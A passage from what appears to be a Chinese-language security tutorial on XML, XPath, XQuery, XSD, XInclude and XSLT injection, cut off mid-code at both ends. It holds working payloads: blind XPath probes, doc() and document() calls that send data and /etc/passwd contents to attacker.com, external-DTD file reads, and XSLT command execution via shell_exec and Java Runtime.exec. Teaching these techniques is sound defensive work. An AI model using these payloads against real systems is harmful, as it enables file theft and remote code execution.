class="meta">&lt;!DOCTYPE &#123;0xdfbf&#125; <span class="keyword">SYSTEM</span> <span class="string">&quot;http://&quot;</span></span></span><br></pre></td></tr></table></figure><h2 id="XML 注入"><a href="#XML 注入" class="headerlink" title="XML 注入"></a>XML 注入 </h2><p> 类似 XSS 中的闭合标签 / 引号。程序将用户输入直接拼接到一个 XML 文档中时，可以通过闭合标签 / 引号的方式注入新的 XML 数据，控制 XML 文档。</p><h2 id="XPath 注入"><a href="#XPath 注入" class="headerlink" title="XPath 注入"></a>XPath 注入</h2><p>SQL 语言是为了从 SQL 数据库中获取数据而产生的语言，同样为了从 XML 文档中获取数据，产生了 XPath 查询语言。类似 SQL 注入，程序将用户输入直接拼接到一个 XPath 查询语句中，造成 XPath 注入，可以获取 XML 文档的数据，甚至控制 XML 文档。</p><p>例如有一个查询语句 <code>/root/users/user[username/text()=&#39;attacker&#39; and password/text()=&#39;yyyy&#39;]</code>，若攻击者将<code>attacker</code> 替换为<code>&#39; or 1=1 or &#39;&#39;=&#39;</code>，那么查询语句就变成了<code>/root/users/user[username/text()=&#39;&#39; or 1=1 or &#39;&#39;=&#39;&#39; and password/text()=&#39;yyyy&#39;]</code>。该查询语句将一直返回 true，导致查询出所有的 user 信息，由于 XPath 不像 SQL 注入有很多访问控制，XPath 的注入没有太多的限制。</p><h3 id="盲注"><a href="# 盲注" class="headerlink" title="盲注"></a>盲注 </h3><h4 id="布尔盲注"><a href="# 布尔盲注" class="headerlink" title="布尔盲注"></a> 布尔盲注 </h4><p> 在无回显的情况下，XPath 也可以盲注。首先需要获取某个节点下子节点的数量。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or count(/*) = 1 or &#x27;1&#x27; = &#x27;2</span><br><span class="line">&#x27; or count(/*) = 2 or &#x27;1&#x27; = &#x27;2</span><br><span class="line">&#x27; or count(/*) = 3 or &#x27;1&#x27; = &#x27;2</span><br><span class="line">&#x27; or count(/*) = 4 or &#x27;1&#x27; = &#x27;2</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>之后爆破出该节点的名字。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or substring(name(/*[position() = 1]),1,1)=&#x27;a&#x27; or &#x27;1&#x27;=&#x27;2</span><br><span class="line">&#x27; or substring(name(/*[position() = 1]),1,1)=&#x27;b&#x27; or &#x27;1&#x27;=&#x27;2</span><br><span class="line">&#x27; or substring(name(/*[position() = 1]),1,1)=&#x27;c&#x27; or &#x27;1&#x27;=&#x27;2</span><br><span class="line">&#x27; or substring(name(/*[position() = 1]),1,1)=&#x27;d&#x27; or &#x27;1&#x27;=&#x27;2</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>利用同样的方法也可以爆破出节点的属性。</p><h4 id="HTTP 外带"><a href="#HTTP 外带" class="headerlink" title="HTTP 外带"></a>HTTP 外带 </h4><p> 在 XPath 2.0 中，提供一个 <code>doc</code> 函数，该函数可以从 web 服务器中请求一个 xml 文档，利用这个 HTTP 请求，可以将数据外带到 web 服务器中。下面的 payload 可以将根节点的名字外带到 web 服务器中。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or doc(concat(&quot;http://attacker.com/?data=&quot;, encode-foruri(/*[1]/name()))) or &#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure><h4 id="DNS 外带"><a href="#DNS 外带" class="headerlink" title="DNS 外带"></a>DNS 外带 </h4><p> 同样可以利用 DNS 外带数据，下面的 payload 可以将根节点的名字外带到 DNS 服务器中。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or doc(concat(encode-foruri(/*[1]/name()), &#x27;.attacker.com&#x27;)) or &#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure><h3 id="常用函数"><a href="# 常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><ul><li><code>count(/root/*)</code> 获取 <code>root</code> 节点下所有子节点的数量。</li><li><code>string-length(/*[1]/*[1]/name())</code> 获取第一个节点下第一个节点的名字的长度。</li><li><code>substring(/*[1]/*[1]/name(), 1, 1)</code> 截取第一个节点下第一个节点的名字的第一个字符。</li><li><code>lower-case(&quot;A&quot;) = &quot;a&quot;</code> 用于判断 XPath 版本，此函数在 2.0 中才加入。</li><li><code>base-uri()</code> 返回该 XML 文档文件的位置，XPath 2.0 加入。</li><li><code>/root/a/text()</code> 获取 root 节点下 a 节点的文本内容。</li><li><code>matches(/*[1]/name(), &#39;[A-Z]+&#39;)</code>  通过正则表达式验证。</li><li><code>string-to-codepoints(&quot;abc&quot;)</code> 将字符串转换为 Ascii 码(97, 98, 99)。</li><li><code>(if 1 then 1 else 0)</code> 条件表达式，可用于布尔盲注。</li><li><code>concat(&#39;a&#39;, &#39;b&#39;)</code> 字符串链接。</li><li><code>doc(‘http://attacker.com/a.xml’)</code> 从 web 服务器上读取一个 xml 文档，XPath 2.0 加入。此功能不是默认启用，并且 URI 若不是 xml 文档会报错。</li><li><code>encode-foruri(&#39;abc&#39;)</code> URL 编码，XPath 2.0 加入。</li></ul><h3 id="XPath 语法速查"><a href="#XPath 语法速查" class="headerlink" title="XPath 语法速查"></a>XPath 语法速查 </h3><p> 更多 XPath 知识，参考<a href="https://www.w3school.com.cn/xpath/index.asp">w3school</a>。</p><h4 id="节点类型"><a href="# 节点类型" class="headerlink" title="节点类型"></a>节点类型</h4><p>XPath 中将 XML 节点分为以下几种类型：</p><ul><li><code>element</code> 元素 / 节点</li><li><code>attribute</code> 属性</li><li><code>text</code> 文本</li><li><code>namespace</code> 命名空间</li><li><code>processing-instruction</code> 处理指令</li><li><code>comment</code> 注释</li><li><code>root</code> 根节点</li></ul><h4 id="表达式"><a href="# 表达式" class="headerlink" title="表达式"></a>表达式</h4><p>XPath 通过表达式选取 XML 节点，常用表达式如下：</p><ul><li><code>nodename</code> 选取此节点的所有子节点</li><li><code>/</code> 从根节点选取</li><li><code>//</code> 从匹配选择的当前节点选择文档中的节点，不考虑它们的位置</li><li><code>.</code> 选取当前节点</li><li><code>..</code> 选取当前节点的父节点</li><li><code>@</code> 选取属性</li></ul><p>例如：</p><ul><li><code>bookstore</code> 选取 bookstore 元素所有的子节点</li><li><code>/bookstore</code> 选取根节点 bookstore</li><li><code>bookstore/book</code> 选取 bookstore 节点下所有子节点中的 book 节点</li><li><code>//book</code> 选取所有的 book 节点，不论在文档中的位置在哪</li><li><code>bookstore//book</code> 选取 bookstore 节点中所有后代节点中的 book 节点</li><li><code>//@lang</code> 选取名为 lang 的所有属性</li></ul><h4 id="限定语"><a href="# 限定语" class="headerlink" title="限定语"></a>限定语 </h4><p> 通过限定语可以选取某个具体的节点，限定语跟在节点后，包裹在方括号中，例如：</p><ul><li><code>/bookstore/book[1]</code> 选取属于 bookstore 子节点中的第一个 book 节点</li><li><code>/bookstore/book[last()]</code> 选取属于 bookstore 子节点中的最后一个 book 节点</li><li><code>//title[@lang]</code> 选取所有拥有名为 lang 的属性的 title 节点</li><li><code>//title[@lang=&#39;eng&#39;]</code> 选取所有 title 节点，且这些节点拥有值为 eng 的 lang 属性</li><li><code>/bookstore/book[price&gt;3.500]/title</code> 选取 bookstore 节点中的 book 节点的所有 title 节点，且其中的 price 节点的值须大于 35.00</li></ul><h4 id="通配符"><a href="# 通配符" class="headerlink" title="通配符"></a>通配符</h4><p>XPath 支持部分通配符选择元素：</p><ul><li><code>*</code> 匹配任意节点</li><li><code>@*</code> 匹配任意属性节点</li></ul><p>例如：</p><ul><li><code>/bookstore/*</code> 选择 bookstore 节点下的所有子节点</li><li><code>//*</code> 选择文档中所有节点</li><li><code>//title[@*]</code> 选择所有带有属性的节点</li></ul><h4 id="多路径查询"><a href="# 多路径查询" class="headerlink" title="多路径查询"></a>多路径查询 </h4><p>XPath 支持使用<code>|</code> 进行多路径查询，例如：</p><ul><li><code>//book/title | //book/price</code> 选择 book 节点下的所有 title 和 price 节点</li><li><code>bookstore/book/title | //price</code> 选择属于 bookstore 节点的 book 节点下的所有 title 节点以及文档中所有 price 节点</li></ul><h2 id="XQuery 注入"><a href="#XQuery 注入" class="headerlink" title="XQuery 注入"></a>XQuery 注入 </h2><p>XQuery 是 XPath 的超集，XQuery 可以赋予 XPath 逻辑编程能力，例如下面的代码会遍历每一个从<code>users</code> 中查询出的节点，并且返回该节点下的 <code>username</code> 节点。</p><figure class="highlight xpath"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="variable">$user</span> <span class="keyword">in</span> //users[@role=<span class="string">&#x27;admin&#x27;</span>] <span class="keyword">return</span> <span class="variable">$user</span>/username</span><br></pre></td></tr></table></figure><p>若上述查询中，<code>admin</code>字符串可控，那么就可以注入 XPath 查询甚至 XQuery 代码，下面的代码利用<code>doc</code>，循环便利整个 xml 文档，将所有整个文档发送到攻击者的服务器中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> $n <span class="keyword">in</span> /*[<span class="number">1</span>]/*</span><br><span class="line">    let $x := <span class="keyword">for</span> $att <span class="keyword">in</span> $n/@* <span class="keyword">return</span>(concat(name($att), <span class="string">&quot;=&quot;</span>, encode-<span class="keyword">for</span>-uri($att)))</span><br><span class="line">    let $y := doc(concat(</span><br><span class="line">        <span class="string">&quot;http://attacker.com/?name=&quot;</span>, encode-<span class="keyword">for</span>-uri(name($n)), </span><br><span class="line">        <span class="string">&quot;&amp;amp;data=&quot;</span>, encode-<span class="keyword">for</span>-uri($n/text()),</span><br><span class="line">        <span class="string">&quot;&amp;amp;attr_&quot;</span>, string-join($x,<span class="string">&quot;&amp;amp;attr_&quot;</span>)</span><br><span class="line">    ))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> $c <span class="keyword">in</span> $n/child::*</span><br><span class="line">        let $x := <span class="keyword">for</span> $att <span class="keyword">in</span> $c/@* <span class="keyword">return</span>(concat(name($c), <span class="string">&quot;=&quot;</span>, encode-<span class="keyword">for</span>-uri($c)))</span><br><span class="line">        let $y := doc(concat(</span><br><span class="line">            <span class="string">&quot;http://attacker.com/?child=1&amp;amp;name=&quot;</span>, encode-<span class="keyword">for</span>-uri(name($c)),</span><br><span class="line">            <span class="string">&quot;&amp;amp;data=&quot;</span>, encode-<span class="keyword">for</span>-uri($c/text()),</span><br><span class="line">            <span class="string">&quot;&amp;amp;attr_&quot;</span>, string-join($x,<span class="string">&quot;&amp;amp;attr_&quot;</span>)</span><br><span class="line">        )) </span><br></pre></td></tr></table></figure><p>Exist-DB 是一个类似 SQLite 的本地 xml 数据库，可以通过 XQuery 进行查询。不同于其他数据库，Exist-DB 使用 HTTP 接口进行查询，例如 REST, XML-RPC, WebDAV 和 SOAP。更多 XQuery 知识，参考<a href="https://www.w3school.com.cn/xquery/index.asp">w3school</a></p><h2 id="XSD 注入"><a href="#XSD 注入" class="headerlink" title="XSD 注入"></a>XSD 注入</h2><p>XSD (XML Schema Definition) 是一种用来描述 XML 文档元素的定义方法，可以用来代替 DTD，比 DTD 更加强大，功能也更多。更多 XSD 知识，请参考<a href="https://www.w3school.com.cn/schema/index.asp">w3school</a></p><h3 id="XSD-schemaLocation"><a href="#XSD-schemaLocation" class="headerlink" title="XSD schemaLocation"></a>XSD schemaLocation</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ttt:data</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:ttt</span>=<span class="string">&quot;http://attacker.com/attack&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;ttt http://attacker.com/<span class="symbol">&amp;internal;</span>&quot;</span>&gt;</span>4<span class="tag">&lt;/<span class="name">ttt:data</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中 <code>evil.dtd</code> 中的内容为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="keyword">SYSTEM</span> “file:///etc/passwd”&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">param1</span> “&lt;!ENTITY <span class="keyword">internal</span> ‘%payload;’&gt;</span>”&gt;</span><br><span class="line">%param1;</span><br></pre></td></tr></table></figure><h3 id="XSD-noNamespaceSchemaLocation"><a href="#XSD-noNamespaceSchemaLocation" class="headerlink" title="XSD noNamespaceSchemaLocation"></a>XSD noNamespaceSchemaLocation</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">”http://www.w3.org/2001/XMLSchema-instance”</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:noNamespaceSchemaLocation</span>=<span class="string">”http://attacker.com/&amp;internal;”</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中 <code>evil.dtd</code> 中的内容为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="keyword">SYSTEM</span> “file:///etc/passwd”&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">param1</span> “&lt;!ENTITY <span class="keyword">internal</span> ‘%payload;’&gt;</span>”&gt;</span><br><span class="line">%param1;</span><br></pre></td></tr></table></figure><h3 id="XSD-Include-import"><a href="#XSD-Include-import" class="headerlink" title="XSD Include/import"></a>XSD Include/import</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xs:schema</span> <span class="attr">elementFormDefault</span>=<span class="string">&quot;qualified&quot;</span> <span class="attr">xmlns:xs</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="attr">xmlns:myNS</span>=<span class="string">&quot;myNS&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:import</span> <span class="attr">namespace</span>=<span class="string">&quot;myNS&quot;</span> <span class="attr">schemaLocation</span>=<span class="string">&quot;http://attacker.com/evil.xsd&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:include</span> <span class="attr">namespace</span>=<span class="string">&quot;myNS2&quot;</span> <span class="attr">schemaLocation</span>=<span class="string">&quot;http://attacker.com/evil.xsd&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xs:schema</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XInclude"><a href="#XInclude" class="headerlink" title="XInclude"></a>XInclude</h3><blockquote><p>XInclude 需要手动开启。</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xi</span>=<span class="string">”http://www.w3.org/2001/XInclude”</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">”http://attacker.com/&amp;internal;”</span> <span class="attr">parse</span>=<span class="string">”text”</span>&gt;</span><span class="tag">&lt;/<span class="name">xi:include</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中 <code>evil.dtd</code> 中的内容为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="keyword">SYSTEM</span> “file:///etc/passwd”&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">param1</span> “&lt;!ENTITY <span class="keyword">internal</span> ‘%payload;’&gt;</span>”&gt;</span><br><span class="line">%param1;</span><br></pre></td></tr></table></figure><h3 id="XSD 报错"><a href="#XSD 报错" class="headerlink" title="XSD 报错"></a>XSD 报错</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xs:restriction</span> <span class="attr">base</span>=<span class="string">&quot;xs:string&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:pattern</span> <span class="attr">value</span>=<span class="string">&quot;<span class="symbol">&amp;xxe;</span>&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xs:restriction</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XSLT 注入"><a href="#XSLT 注入" class="headerlink" title="XSLT 注入"></a>XSLT 注入</h2><p>XSLT (EXtensible Stylesheet Language Transform)，是一种扩展样式表转换语言，可以将 XML 转换为其他类型的语言。更多 XSLT 知识，请参考<a href="https://www.w3school.com.cn/xsl/index.asp">w3school</a>。</p><h3 id="获取 XSLT 信息"><a href="# 获取 XSLT 信息" class="headerlink" title="获取 XSLT 信息"></a>获取 XSLT 信息</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    XSLT Version: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;system-property(&#x27;xsl:version&#x27;)&quot;</span> /&gt;</span></span><br><span class="line">    XSLT Vendor: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;system-property(&#x27;xsl:vendor&#x27;)&quot;</span> /&gt;</span></span><br><span class="line">    XSLT Vendor URL: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;system-property(&#x27;xsl:version-url&#x27;)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XSLT-Stylesheet"><a href="#XSLT-Stylesheet" class="headerlink" title="XSLT Stylesheet"></a>XSLT Stylesheet</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;http://attacker.com/evil.xsl&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">doc</span>&gt;</span><span class="tag">&lt;/<span class="name">doc</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XSLT-Include-import"><a href="#XSLT-Include-import" class="headerlink" title="XSLT Include/import"></a>XSLT Include/import</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:import</span> <span class="attr">href</span>=<span class="string">&quot;http://attacker.com/evil.xsl&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:include</span> <span class="attr">href</span>=<span class="string">&quot;http://attacker.com/evil.xsl&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XSLT 读取文件"><a href="#XSLT 读取文件" class="headerlink" title="XSLT 读取文件"></a>XSLT 读取文件 </h3><p> 可读取合法的 xml 文件，或者普通文件的第一行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;document(&#x27;test.xml&#x27;)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;document(&#x27;file:///secret.txt&#x27;)&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>将读取到的文件发送到远程服务器中：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;name1&quot;</span> <span class="attr">select</span>=<span class="string">&quot;document(&#x27;file:///etc/passwd&#x27;)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;name2&quot;</span> <span class="attr">select</span>=<span class="string">&quot;concat(&#x27;http://attacker.com/?&#x27;, $name1)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;name3&quot;</span> <span class="attr">select</span>=<span class="string">&quot;document($name2)&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XSLT-RCE"><a href="#XSLT-RCE" class="headerlink" title="XSLT RCE"></a>XSLT RCE</h3><p>libxslt + php 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:php</span>=<span class="string">&quot;http://php.net/xsl&quot;</span>&gt;</span></span><br><span class="line">          </span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:output</span> <span class="attr">method</span>=<span class="string">&quot;html&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;php:function(&#x27;shell_exec&#x27;, &#x27;sleep 10&#x27;)&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Xalan-Java 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line">xmlns:runtime=&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot;</span><br><span class="line">xmlns:process=&quot;http://xml.apache.org/xalan/java/java.lang.Process&quot;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;rtobject&quot;</span> <span class="attr">select</span>=<span class="string">&quot;runtime:getRuntime()&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;process&quot;</span> <span class="attr">select</span>=<span class="string">&quot;runtime:exec($rtobject, 